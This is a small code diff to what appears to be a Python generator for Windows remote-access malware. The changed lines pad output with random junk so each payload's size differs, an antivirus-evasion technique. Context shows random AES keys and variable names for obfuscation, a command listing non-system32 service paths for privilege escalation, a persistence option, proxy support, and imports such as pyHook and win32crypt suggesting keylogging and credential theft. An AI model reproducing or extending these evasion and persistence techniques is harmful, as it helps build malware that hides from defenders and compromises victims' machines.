@@ -67,8 +67,8 @@ key, iv, secretkey = randKey(32), randKey(16), randKey(32)
 be64var, bd64var, AESvar = randVar(), randVar(), randVar()
 triplequote = "'" * 3
 lswinservices = triplequote + '''for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a''' + triplequote
-junk = randVar() + ' = "' + ''.join(random.choice(string.ascii_uppercase + string.digits + string.ascii_lowercase) for x in range(random.randint(1,25000))) + '"'  # Add a random amount of random shit to make sure the size is always different.
-junk2 = randVar() + ' = "' + ''.join(random.choice(string.ascii_uppercase + string.digits + string.ascii_lowercase) for x in range(random.randint(1,25000))) + '"'  # Add a random amount of random shit to make sure the size is always different.
+junk = randVar() + ' = "' + ''.join(random.choice(string.ascii_letters + string.digits) for x in range(random.randint(1,25000))) + '"'  # Add a random amount of random shit to make sure the size is always different.
+junk2 = randVar() + ' = "' + ''.join(random.choice(string.ascii_letters + string.digits) for x in range(random.randint(1,25000))) + '"'
 
 if args.persistence:
 	persistpart = '''
@@ -105,7 +105,7 @@ mywindows = ['win32crypt', 'pyHook', 'pythoncom', 'win32api', 'win32gui', 'win32
 
 if args.proxy:
 	mywindows.append('socks')
-	
+
 random.shuffle(myimports)
 random.shuffle(myendings)
 random.shuffle(mywindows)
